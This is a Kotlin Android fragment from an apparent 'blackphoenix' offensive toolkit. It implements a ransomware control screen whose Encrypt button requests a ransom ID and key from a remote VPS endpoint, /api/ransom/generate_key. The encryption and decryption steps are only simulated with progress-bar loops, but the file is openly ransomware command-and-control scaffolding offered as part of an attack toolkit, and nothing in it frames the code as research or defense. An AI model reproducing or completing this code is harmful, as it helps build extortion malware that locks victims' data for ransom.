package com.blackphoenix.toolkit.fragments

import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.fragment.app.Fragment
import com.blackphoenix.toolkit.R
import com.blackphoenix.toolkit.utils.VPSConfig
import okhttp3.*
import org.json.JSONObject
import java.io.IOException

class RansomFragment : Fragment() {

    private lateinit var btnEncrypt: Button
    private lateinit var btnDecrypt: Button
    private lateinit var btnStop: Button
    private lateinit var tvStatus: TextView
    private lateinit var tvRansomId: TextView
    private lateinit var tvKey: TextView
    private lateinit var progressBar: ProgressBar

    private var currentRansomId: String = ""
    private var currentKey: String = ""

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View? {
        val view = inflater.inflate(R.layout.fragment_ransom, container, false)

        btnEncrypt = view.findViewById(R.id.btnEncrypt)
        btnDecrypt = view.findViewById(R.id.btnDecrypt)
        btnStop = view.findViewById(R.id.btnStop)
        tvStatus = view.findViewById(R.id.tvStatus)
        tvRansomId = view.findViewById(R.id.tvRansomId)
        tvKey = view.findViewById(R.id.tvKey)
        progressBar = view.findViewById(R.id.progressBar)

        btnEncrypt.setOnClickListener { startEncryption() }
        btnDecrypt.setOnClickListener { startDecryption() }
        btnStop.setOnClickListener {
            tvStatus.text = "⏹️ Stopped"
            tvStatus.setTextColor(0xffff8800)
        }

        return view
    }

    private fun startEncryption() {
        tvStatus.text = "⏳ Requesting encryption key from server..."
        tvStatus.setTextColor(0xffff8800)

        val client = OkHttpClient()
        val json = JSONObject()
        json.put("api_key", VPSConfig.API_KEY)

        val body = RequestBody.create(
            MediaType.parse("application/json; charset=utf-8"),
            json.toString()
        )

        val request = Request.Builder()
            .url("${VPSConfig.VPS_URL}/api/ransom/generate_key")
            .post(body)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                requireActivity().runOnUiThread {
                    tvStatus.text = "❌ Gagal konek ke server"
                    tvStatus.setTextColor(0xffff4444)
                }
            }

            override fun onResponse(call: Call, response: Response) {
                val res = response.body?.string() ?: ""
                requireActivity().runOnUiThread {
                    try {
                        val obj = JSONObject(res)
                        if (obj.getString("status") == "success") {
                            currentRansomId = obj.getString("ransom_id")
                            currentKey = obj.getString("key")

                            tvRansomId.text = "📌 ID: $currentRansomId"
                            tvKey.text = "🔑 Key: ${currentKey.take(16)}..."
                            tvStatus.text = "✅ Key received! Starting encryption..."
                            tvStatus.setTextColor(0xff00ff00)

                            // Simulasi progress
                            progressBar.max = 100
                            for (i in 0..100 step 10) {
                                progressBar.progress = i
                            }
                            tvStatus.text = "✅ Encryption completed!"
                        } else {
                            tvStatus.text = "❌ ${obj.getString("message")}"
                            tvStatus.setTextColor(0xffff4444)
                        }
                    } catch (e: Exception) {
                        tvStatus.text = "❌ Error: ${e.message}"
                        tvStatus.setTextColor(0xffff4444)
                    }
                }
            }
        })
    }

    private fun startDecryption() {
        if (currentRansomId.isEmpty() || currentKey.isEmpty()) {
            Toast.makeText(requireContext(), "Generate key dulu!", Toast.LENGTH_SHORT).show()
            return
        }
        tvStatus.text = "🔓 Decryption started..."
        tvStatus.setTextColor(0xffff8800)
        // Simulasi decrypt
        progressBar.progress = 0
        for (i in 0..100 step 10) {
            progressBar.progress = i
        }
        tvStatus.text = "✅ Decryption completed!"
        tvStatus.setTextColor(0xff00ff00)
    }
}